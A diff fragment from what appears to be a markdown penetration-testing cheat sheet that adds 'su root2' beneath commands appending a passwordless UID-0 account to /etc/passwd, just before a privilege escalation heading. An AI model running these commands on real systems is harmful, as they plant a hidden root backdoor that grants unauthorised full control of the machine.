@@ -20,6 +20,7 @@
 - __creating a new user__
   - __`echo "newRoot::0:0:newRoot:/home/newRoot:/bin/sh" >> /etc/passwd`__
   - __`echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd`__
+    - __`su root2`__
  
 
 - ## Privilege escalation <a name="privilegeescalation"></a>
